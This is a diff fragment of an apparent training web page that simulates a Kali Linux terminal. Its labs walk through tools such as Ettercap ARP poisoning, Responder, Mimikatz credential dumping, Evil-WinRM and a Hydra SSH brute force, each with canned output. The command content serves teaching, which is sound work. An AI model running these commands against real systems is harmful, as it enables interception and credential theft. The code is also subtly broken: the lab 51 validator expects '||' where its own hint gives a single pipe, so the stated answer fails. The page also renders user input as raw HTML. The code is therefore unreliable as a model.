+    {i:"Start Ettercap for ARP poisoning between target and gateway.", h:"Use <code>-T</code> for text mode, <code>-M</code> for MITM attack. Command: <code>ettercap -T -M arp /10.10.10.5// /10.10.10.1//</code>", v:c=>/ettercap\s+-T\s+-M\s+arp\s+\/10\.10\.10\.5\/\/\s+\/10\.10\.10\.1\/\//i.test(c), o:"[*] Starting ARP poisoning...", s:"MITM started."}
+  ]},
+  // 36. Bettercap
+  { t:"36. Bettercap", d:"Modern MITM tool.", o:["Start Bettercap"], s:[
+    {i:"Launch Bettercap on the eth0 interface.", h:"Use <code>-iface</code> to specify the interface. Command: <code>bettercap -iface eth0</code>", v:c=>/bettercap\s+-iface\s+eth0/i.test(c), o:"10.10.10.10 > eth0 » ", s:"Bettercap started."}
+  ]},
+  // 37. Responder
+  { t:"37. Responder", d:"LLMNR/NBT-NS poisoner.", o:["Run Responder"], s:[
+    {i:"Start Responder to capture NetNTLM hashes on eth0.", h:"Use <code>-I</code> for interface, <code>-wrf</code> to enable WPAD, Fingerprinting, and Raw output. Command: <code>responder -I eth0 -wrf</code>", v:c=>/responder\s+-I\s+eth0\s+-wrf/i.test(c), o:"[*] Listening for events...", s:"Responder started."}
+  ]},
+  // 38. ADB
+  { t:"38. ADB", d:"Android Debug Bridge.", o:["Connect to device","Open shell"], s:[
+    {i:"Connect to an Android device over the network.", h:"Use <code>connect</code> and provide IP:port. Command: <code>adb connect 10.10.10.50:5555</code>", v:c=>/adb\s+connect\s+10\.10\.10\.50:5555/i.test(c), o:"connected to 10.10.10.50:5555", s:"Device connected."},
+    {i:"Open an interactive shell on the Android device.", h:"Use the <code>shell</code> command. Command: <code>adb shell</code>", v:c=>/^adb\s+shell$/i.test(c), o:"generic_x86:/ $ ", s:"Shell opened."}
+  ]},
+  // 39. MobSF
+  { t:"39. MobSF", d:"Mobile Security Framework.", o:["Start MobSF"], s:[
+    {i:"Launch MobSF via Docker to scan mobile apps.", h:"Use docker run with port mapping 8000. Command: <code>docker run -p 8000:8000 opensecurity/mobsf</code>", v:c=>/docker\s+run\s+-p\s+8000:8000\s+opensecurity\/mobsf/i.test(c), o:"[*] Starting MobSF on port 8000...", s:"MobSF started."}
+  ]},
+  // 40. Frida
+  { t:"40. Frida", d:"Dynamic instrumentation toolkit.", o:["Hook an app"], s:[
+    {i:"Attach Frida to an Android app to inject scripts.", h:"Use <code>-U</code> for USB, <code>-f</code> for spawn. Command: <code>frida -U -f com.example.app</code>", v:c=>/frida\s+-U\s+-f\s+com\.example\.app/i.test(c), o:"[*] Spawning com.example.app...\n[+] Attached!", s:"Frida attached."}
+  ]},
+  // 41. Hashid
+  { t:"41. Hashid", d:"Identify hash types.", o:["Identify hash"], s:[
+    {i:"Identify the hash type of a string and show Hashcat modes.", h:"Use <code>-m</code> to show hashcat mode. Command: <code>hashid -m '5f4dcc3b5aa765d61d8327deb882cf99'</code>", v:c=>/hashid\s+-m\s+['"]5f4dcc3b.*['"]/i.test(c), o:"[+] MD5 [Hashcat Mode: 0]", s:"Hash identified."}
+  ]},
+  // 42. Steghide
+  { t:"42. Steghide", d:"Hide data in files.", o:["Extract stego data"], s:[
+    {i:"Extract hidden data from an image file.", h:"Use <code>extract</code> and <code>-sf</code> for stego file. Command: <code>steghide extract -sf image.jpg</code>", v:c=>/steghide\s+extract\s+-sf\s+image\.jpg/i.test(c), o:"wrote extracted data to \"secret.txt\"", s:"Data extracted."}
+  ]},
+  // 43. Binwalk
+  { t:"43. Binwalk", d:"Analyze and extract firmware.", o:["Extract firmware"], s:[
+    {i:"Extract embedded files from a firmware image.", h:"Use <code>-e</code> to extract. Command: <code>binwalk -e firmware.bin</code>", v:c=>/binwalk\s+-e\s+firmware\.bin/i.test(c), o:"[*] Extracting...\n[+] Found Squashfs filesystem at offset 0x1000", s:"Firmware extracted."}
+  ]},
+  // 44. Mimikatz
+  { t:"44. Mimikatz", d:"Extract Windows credentials.", o:["Debug privilege","Dump passwords"], s:[
+    {i:"Enable debug privileges in Windows.", h:"Type the module command. Command: <code>privilege::debug</code>", v:c=>/privilege::debug/i.test(c), o:"[*] Privilege '20' OK", s:"Debug privilege enabled."},
+    {i:"Dump clear-text passwords from memory.", h:"Use the <code>sekurlsa::logonpasswords</code> module. Command: <code>sekurlsa::logonpasswords</code>", v:c=>/sekurlsa::logonpasswords/i.test(c), o:"Username: admin\nPassword: P@ssw0rd", s:"Credentials dumped."}
+  ]},
+  // 45. PowerSploit
+  { t:"45. PowerSploit", d:"PowerShell post-exploitation.", o:["Run Mimikatz"], s:[
+    {i:"Invoke Mimikatz via the PowerSploit PowerShell module.", h:"Use the <code>Invoke-Mimikatz</code> cmdlet. Command: <code>Invoke-Mimikatz -Command \"privilege::debug\"</code>", v:c=>/Invoke-Mimikatz/i.test(c), o:"[*] Privilege '20' OK", s:"PowerSploit executed."}
+  ]},
+  // 46. Evil-WinRM
+  { t:"46. Evil-WinRM", d:"WinRM shell for hacking.", o:["Connect via WinRM"], s:[
+    {i:"Connect to a target using Evil-WinRM with credentials.", h:"Use <code>-i</code> for IP, <code>-u</code> for user, <code>-p</code> for password. Command: <code>evil-winrm -i 10.10.10.5 -u admin -p Password1</code>", v:c=>/evil-winrm\s+-i\s+10\.10\.10\.5\s+-u\s+admin\s+-p\s+Password1/i.test(c), o:"*Evil-WinRM* PS C:\\Users\\admin\\Documents>", s:"WinRM shell obtained."}
+  ]},
+  // 47. Dradis
+  { t:"47. Dradis", d:"Collaboration and reporting.", o:["Start Dradis"], s:[
+    {i:"Start the Dradis reporting server.", h:"Run the command. Command: <code>dradis</code>", v:c=>/^dradis$/i.test(c), o:"[*] Starting Dradis on port 3000...", s:"Dradis started."}
+  ]},
+  // 48. Faraday
+  { t:"48. Faraday", d:"Multi-user pentest IDE.", o:["Launch Faraday"], s:[
+    {i:"Launch the Faraday client GUI in the background.", h:"Run the command with <code>&</code>. Command: <code>faraday &</code>", v:c=>/^faraday\s*&$/i.test(c), o:"Starting Faraday IDE...", s:"Faraday launched."}
+  ]},
+  // 49. CherryTree
+  { t:"49. CherryTree", d:"Note-taking tool.", o:["Launch CherryTree"], s:[
+    {i:"Open the CherryTree note-taking application.", h:"Run the command with <code>&</code>. Command: <code>cherrytree &</code>", v:c=>/^cherrytree\s*&$/i.test(c), o:"Starting CherryTree...", s:"CherryTree opened."}
+  ]},
+  // 50. Pipal
+  { t:"50. Pipal", d:"Password analyser.", o:["Analyze passwords"], s:[
+    {i:"Analyze a password list to find common patterns.", h:"Provide the password file. Command: <code>pipal passwords.txt</code>", v:c=>/pipal\s+passwords\.txt/i.test(c), o:"[+] Most common base word: summer", s:"Passwords analyzed."}
+  ]},
+  // 51. Tool Chaining
+  { t:"51. Tool Chaining", d:"Combining tools for assessment.", o:["Chain Nmap and Hydra"], s:[
+    {i:"Find SSH port with Nmap, and if open, brute force it with Hydra.", h:"Chain commands using <code>|</code> and <code>&&</code>. Command: <code>nmap -p 22 10.10.10.5 | grep open && hydra -l admin -P rockyou.txt ssh://10.10.10.5</code>", v:c=>/nmap\s+-p\s+22\s+10\.10\.10\.5\s*\|\|\s*grep\s+open\s*&&\s*hydra\s+-l\s+admin\s+-P\s+rockyou\.txt\s+ssh:\/\/10\.10\.10\.5/i.test(c), o:"22/tcp open ssh\n[22][ssh] password: letmein123", s:"Chaining successful."}
+  ]},
+  // 52. Custom Dev
+  { t:"52. Custom Dev", d:"Develop custom tools.", o:["Write a Python scanner"], s:[
+    {i:"Run your custom python port scanner against the target.", h:"Execute the python script with the target IP argument. Command: <code>python3 custom_scanner.py 10.10.10.5</code>", v:c=>/python3\s+custom_scanner\.py\s+10\.10\.10\.5/i.test(c), o:"[+] Host is alive. Open ports: [80, 443]", s:"Custom tool executed."}
+  ]}
+];
+
+let currentLab = 0;
+let currentStep = 0;
+let history = [];
+let histIdx = -1;
+let completedLabs = new Set();
+
+const T = document.getElementById('term');
+const Hint = document.getElementById('hint');
+const Steps = document.getElementById('steps');
+const LabTitle = document.getElementById('labTitle');
+const LabDesc = document.getElementById('labDesc');
+const ObjList = document.getElementById('objectives');
+const NextBtn = document.getElementById('nextBtn');
+const CompletedCount = document.getElementById('completedCount');
+
+function renderSidebar() {
+  const sb = document.getElementById('sidebar');
+  let html = `
+    <div class="sidebar-title">Top 50 Kali Linux Tools: <span>Comprehensive Guide</span> for Security Professionals</div>
+    <a href="paid-cybersecurity-course.html" class="back-btn"><i class="fas fa-arrow-left"></i> Back to Attack Labs</a>
+  `;
+  let labIdx = 0;
+  CATS.forEach(cat => {
+    html += `<div class="cat-label">${cat.name}</div>`;
+    cat.tools.forEach(tool => {
+      const done = completedLabs.has(labIdx);
+      const active = currentLab === labIdx;
+      html += `<div class="lab-item ${active?'active':''} ${done?'done':''}" onclick="loadLab(${labIdx})"><i class="fas fa-terminal"></i> ${tool}</div>`;
+      labIdx++;
+    });
+  });
+  sb.innerHTML = html;
+}
+
+function loadLab(idx) {
+  currentLab = idx;
+  currentStep = 0;
+  history = [];
+  histIdx = -1;
+  
+  const lab = LABS[idx];
+  LabTitle.innerHTML = `<i class="fas fa-toolbox"></i> ${lab.t}`;
+  LabDesc.innerText = lab.d;
+  ObjList.innerHTML = lab.o.map(o => `<li>${o}</li>`).join('');
+  NextBtn.innerHTML = "Next Lab <i class='fas fa-arrow-right'></i>";
+  
+  renderSidebar();
+
+  if (idx === LABS.length - 1) {
+    NextBtn.onclick = () => window.location.href = 'paid-cybersecurity-course.html';
+  } else {
+    NextBtn.onclick = () => loadLab(idx + 1);
+  }
+  NextBtn.style.display = 'none';
+
+  initTerminal();
+}
+
+function initTerminal() {
+  const lab = LABS[currentLab];
+  Steps.innerHTML = lab.s.map((_, i) => `<div class="step-dot ${i===0?'active':''}"></div>`).join('');
+  renderHint();
+  T.innerHTML = `<div class="t-line t-out"># Welcome to ${lab.t}. Type commands and press Enter.</div>`;
+  addInput();
+}
+
+function renderHint() {
+  const step = LABS[currentLab].s[currentStep];
+  Hint.innerHTML = `<strong style="color:#ffd93d">Hint:</strong> ${step.h}`;
+}
+
+function addInput() {
+  const d = document.createElement('div');
+  d.className = 'input-line';
+  d.innerHTML = `<span class="t-prompt">root@kali:~$</span><input type="text" id="in" autocomplete="off">`;
+  T.appendChild(d);
+  const i = document.getElementById('in');
+  i.focus();
+  i.addEventListener('keydown', e => {
+    if (e.key === 'Enter') exec(i.value);
+    else if (e.key === 'ArrowUp' && histIdx > 0) { e.preventDefault(); histIdx--; i.value = history[histIdx]; }
+    else if (e.key === 'ArrowDown' && histIdx < history.length - 1) { e.preventDefault(); histIdx++; i.value = history[histIdx]; }
+  });
+}
+
+function exec(c) {
+  if (!c.trim()) return;
+  history.push(c);
+  histIdx = history.length;
+  
+  const i = document.getElementById('in');
+  i.remove();
+  
+  const e = document.createElement('div');
+  e.className = 't-line';
+  e.innerHTML = `<span class="t-prompt">root@kali:~$</span> <span class="t-cmd">${c}</span>`;
+  T.appendChild(e);
+
+  const step = LABS[currentLab].s[currentStep];
+  
+  if (step.v(c)) {
+    typeOut(step.o, () => {
+      const s = document.createElement('div');
+      s.className = 't-line t-suc';
+      s.textContent = '[+] ' + step.s;
+      T.appendChild(s);
+      
+      currentStep++;
+      
+      if (currentStep < LABS[currentLab].s.length) {
+        Steps.innerHTML = LABS[currentLab].s.map((_, i) => `<div class="step-dot ${i===currentStep?'active':''} ${i<currentStep?'done':''}"></div>`).join('');
+        renderHint();
+        addInput();
+      } else {
+        completeLab();
+      }
+    });
+  } else {
+    const er = document.createElement('div');
+    er.className = 't-line t-err';
+    er.textContent = '[-] Invalid command. Check the hint and try again.';
+    T.appendChild(er);
+    addInput();
+  }
+  T.scrollTop = T.scrollHeight;
+}
+
+function typeOut(t, cb) {
+  let lines = t.split('\n');
+  let l = 0;
+  function nxt() {
+    if (l >= lines.length) { setTimeout(cb, 100); return; }
+    const d = document.createElement('div');
+    d.className = 't-line t-out';
+    d.textContent = lines[l];
+    T.appendChild(d);
+    T.scrollTop = T.scrollHeight;
+    l++;
+    setTimeout(nxt, 50);
+  }
+  nxt();
+}
+
+function completeLab() {
+  T.innerHTML += '<div class="t-line t-suc" style="margin-top:10px;">[!!!] LAB COMPLETE!</div>';
+  Hint.innerHTML = '<strong style="color:#00ff9c">Lab Complete! Proceed to the next lab.</strong>';
+  
+  completedLabs.add(currentLab);
+  renderSidebar();
+  CompletedCount.innerText = completedLabs.size;
+  
+  NextBtn.style.display = 'inline-flex';
+}
+
+function showSol() {
+  const i = document.getElementById('in');
+  if (i) {
+    const m = LABS[currentLab].s[currentStep].h.match(/Command: <code>([^<]+)<\/code>/);
+    if (m) i.value = m[1];
+    i.focus();
+  }
+}
+
+function clr() { initTerminal(); }
+
+function resetLab() {
+  if (confirm('Reset current lab?')) {
+    completedLabs.delete(currentLab);
+    loadLab(currentLab);
+  }
+}
+
+renderSidebar();
+loadLab(0);
+</script>
+</body>
+</html>
